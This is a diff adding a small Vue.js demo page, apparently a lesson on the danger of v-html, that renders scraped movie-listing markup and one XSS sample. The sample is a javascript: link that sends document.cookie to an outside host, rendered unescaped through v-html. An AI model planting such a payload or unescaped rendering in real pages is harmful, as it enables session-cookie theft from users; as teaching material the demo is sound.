@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <script src="lib/vue.js"></script>
+</head>
+
+<body>
+  <div id="box">
+    <button @click="handleAjax()">ajax</button>
+
+    <div >{{mydanger}}</div>
+    <div v-html="mydanger"></div>
+
+    <div>
+      {{myhtml}}
+    </div>
+
+    <div v-html="myhtml">
+
+    </div>
+
+
+
+  </div>
+  <script>
+    new Vue({
+      el: "#box",
+      data: {
+        myhtml: "",
+        mydanger:""
+      },
+      methods: {
+        handleAjax() {
+          this.mydanger  ="<a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>男人看了沉默.</a>"
+
+
+          this.myhtml = `<div class="top-rated">
+  <p class="title">最受好评电影</p>
+  <div class="top-rated-list">
+    <div class="top-rated-item" data-id=1299372 >
+        <div class="poster default-img-bg">
+          <img src=https://p0.meituan.net/170.230/movie/48774506dc0e68805bc25d2cd087d1024316392.jpg  onerror="this.style.visibility='hidden'">
+          <span class="wish-bg"></span>
+            <span class="score">观众评分&nbsp;&nbsp;<span class="rated-score">9.5</span></span>
+        </div>
+        <h5 class="name line-ellipsis">你好，李焕英</h5>
+    </div>
+    <div class="top-rated-item" data-id=1300936 >
+        <div class="poster default-img-bg">
+          <img src=https://p0.meituan.net/170.230/movie/8a1ad4ec0d81f240e4d8c2d1b10c2ec53475644.jpg  onerror="this.style.visibility='hidden'">
+          <span class="wish-bg"></span>
+            <span class="score">观众评分&nbsp;&nbsp;<span class="rated-score">9.1</span></span>
+        </div>
+        <h5 class="name line-ellipsis">人潮汹涌</h5>
+    </div>
+    <div class="top-rated-item" data-id=1222234 >
+        <div class="poster default-img-bg">
+          <img src=https://p0.meituan.net/170.230/movie/e2ecb7beb8dadc9f07f2fad9820459f92275588.jpg  onerror="this.style.visibility='hidden'">
+          <span class="wish-bg"></span>
+            <span class="score">观众评分&nbsp;&nbsp;<span class="rated-score">9</span></span>
+        </div>
+        <h5 class="name line-ellipsis">我的姐姐</h5>
+    </div>
+    <div class="top-rated-item" data-id=343568 >
+        <div class="poster default-img-bg">
+          <img src=https://p0.meituan.net/170.230/moviemachine/58732574fbc2f64c04c3e825c058da7f16742753.jpg  onerror="this.style.visibility='hidden'">
+          <span class="wish-bg"></span>
+            <span class="score">观众评分&nbsp;&nbsp;<span class="rated-score">8.9</span></span>
+        </div>
+        <h5 class="name line-ellipsis">哥斯拉大战金刚</h5>
+    </div>
+    <div class="top-rated-item" data-id=341051 >
+        <div class="poster default-img-bg">
+          <img src=https://p1.meituan.net/170.230/moviemachine/cdeb4c44ed395f19c07c8778e283f86a2221119.jpg  onerror="this.style.visibility='hidden'">
+          <span class="wish-bg"></span>
+            <span class="score">观众评分&nbsp;&nbsp;<span class="rated-score">8.5</span></span>
+        </div>
+        <h5 class="name line-ellipsis">百团大战</h5>
+    </div>
+    <div class="top-rated-item" data-id=345006 >
+        <div class="poster default-img-bg">
+          <img src=https://p0.meituan.net/170.230/movie/d6e3e1dc75fd4fbcd3ebc7fb7c09f1d72989216.jpg  onerror="this.style.visibility='hidden'">
+          <span class="wish-bg"></span>
+            <span class="score">观众评分&nbsp;&nbsp;<span class="rated-score">8.3</span></span>
+        </div>
+        <h5 class="name line-ellipsis">西游记之再世妖王</h5>
+    </div>
+    <div class="top-rated-item" data-id=1229308 >
+        <div class="poster default-img-bg">
+          <img src=https://p0.meituan.net/170.230/movie/c5c0f985b2f85e3920eb2ecd80d58d331466056.jpg  onerror="this.style.visibility='hidden'">
+          <span class="wish-bg"></span>
+            <span class="score">观众评分&nbsp;&nbsp;<span class="rated-score">8</span></span>
+        </div>
+        <h5 class="name line-ellipsis">第十一回</h5>
+    </div>
+    <div class="top-rated-item" data-id=1322057 >
+        <div class="poster default-img-bg">
+          <img src=https://p0.meituan.net/170.230/movie/7f73fd63f27f8a952c484ac3773505ac202519.jpg  onerror="this.style.visibility='hidden'">
+          <span class="wish-bg"></span>
+            <span class="score">观众评分&nbsp;&nbsp;<span class="rated-score">6.7</span></span>
+        </div>
+        <h5 class="name line-ellipsis">明天会好的</h5>
+    </div>
+    <div class="top-rated-item" data-id=1309640 >
+        <div class="poster default-img-bg">
+          <img src=https://p0.meituan.net/170.230/moviemachine/66e69d0559ad525a3b6684d5f9c0b3ba1814251.jpg  onerror="this.style.visibility='hidden'">
+          <span class="wish-bg"></span>
+            <span class="wish"><span class="wish-num">683</span>人想看</span>
+        </div>
+        <h5 class="name line-ellipsis">平安中国之守护者</h5>
+    </div>
+    <div class="top-rated-item" data-id=672203 >
+        <div class="poster default-img-bg">
+          <img src=https://p0.meituan.net/170.230/movie/81141b5b22506a06b585347eb5d90aff2828703.jpg  onerror="this.style.visibility='hidden'">
+          <span class="wish-bg"></span>
+            <span class="wish"><span class="wish-num">40163</span>人想看</span>
+        </div>
+        <h5 class="name line-ellipsis">超级的我</h5>
+    </div>
+    <div class="top-rated-item" data-id=1302233 >
+        <div class="poster default-img-bg">
+          <img src=https://p0.meituan.net/170.230/movie/655b4ce3400ed27b90a664271520b0cc2073628.jpg  onerror="this.style.visibility='hidden'">
+          <span class="wish-bg"></span>
+            <span class="wish"><span class="wish-num">14845</span>人想看</span>
+        </div>
+        <h5 class="name line-ellipsis">圣山村谜局</h5>
+    </div>
+    <div class="top-rated-item" data-id=1336427 >
+        <div class="poster default-img-bg">
+          <img src=https://p1.meituan.net/170.230/movie/20dc4e981a012c9afc2b9d6e859a6af74794370.jpg  onerror="this.style.visibility='hidden'">
+          <span class="wish-bg"></span>
+            <span class="wish"><span class="wish-num">33944</span>人想看</span>
+        </div>
+        <h5 class="name line-ellipsis">工作细胞：细胞大作战</h5>
+    </div>
+  </div>
+</div>
+`
+        }
+      }
+    })
+  </script>
+</body>
+
+</html>
